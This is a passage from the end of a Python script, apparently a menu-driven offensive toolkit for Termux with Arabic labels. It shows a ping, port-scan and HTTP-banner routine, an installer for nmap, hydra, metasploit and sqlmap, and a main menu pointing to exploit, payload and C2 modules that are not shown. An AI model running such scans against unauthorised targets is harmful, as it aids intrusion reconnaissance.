        r = subprocess.run(["ping","-c","1","-W","2",target], capture_output=True, timeout=5)
        print(G + "[✓] " + ("متصل" if r.returncode == 0 else "لا يستجيب للـ Ping") + N)
    except: print(Y + "[?] فشل Ping" + N)
    try:
        ip = socket.gethostbyname(target)
        print(C + "[+] IP: " + ip + N)
    except: ip = target; print(R + "[✗] فشل حل الاسم" + N)
    print(Y + "\n[*] فحص المنافذ..." + N)
    ports = {21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",110:"POP3",143:"IMAP",443:"HTTPS",445:"SMB",3306:"MySQL",3389:"RDP",5432:"PostgreSQL",5900:"VNC",6379:"Redis",8080:"HTTP-Proxy",8443:"HTTPS-Alt",27017:"MongoDB"}
    open_ports = []
    for port, svc in ports.items():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        try:
            if s.connect_ex((ip, port)) == 0:
                open_ports.append((port, svc))
                print(G + "[✓] " + str(port) + "/" + svc + " مفتوح" + N)
        except: pass
        finally: s.close()
    if not open_ports: print(C + "[-] لا توجد منافذ مفتوحة" + N)
    for proto in ['http','https']:
        try:
            r = requests.get(proto + "://" + target, timeout=5, headers={'User-Agent':'Mozilla/5.0'})
            print(G + "[✓] " + proto.upper() + " - " + str(r.status_code) + N)
            if 'Server' in r.headers: print(C + "    السيرفر: " + r.headers['Server'] + N)
            break
        except: pass
    print(G + "\n[✓] اكتمل!" + N)
    print(C + "[+] " + str(len(open_ports)) + " منفذ مفتوح" + N)
    press_enter()


def install_deps():
    print(Y + "[*] تثبيت المتطلبات..." + N)
    os.system("pkg update -y && pkg upgrade -y")
    for pkg in ["python","python-pip","git","wget","curl","nmap","hydra","metasploit","sqlmap","termux-api","openssh","dnsutils","net-tools","traceroute"]:
        print(C + "[+] " + pkg + N)
        os.system("pkg install -y " + pkg + " 2>/dev/null")
    os.system("pip install colorama requests dnspython python-whois 2>/dev/null")
    print(G + "[✓] تم!" + N)
    press_enter()


def main():
    try:
        while True:
            print_banner()
            print_main_menu()
            c = input(G + "╰➤ " + Y + "اختر [0-10]: " + N).strip()
            if c == "0": print(R + "\n[!] شكراً! إلى اللقاء 👋" + N); sys.exit(0)
            elif c == "1": osint_menu()
            elif c == "2": scanner_menu()
            elif c == "3": exploit_menu()
            elif c == "4": payload_menu()
            elif c == "5": network_menu()
            elif c == "6": recon_menu()
            elif c == "7": web_menu()
            elif c == "8": c2_menu()
            elif c == "9": flipper_menu()
            elif c == "10": quick_scan()
            elif c == "99": install_deps()
            else: print(R + "[!] اختيار غير صالح!" + N); press_enter()
    except KeyboardInterrupt:
        print(R + "\n[!] تم الإيقاف" + N); sys.exit(0)

if __name__ == "__main__":
    main()
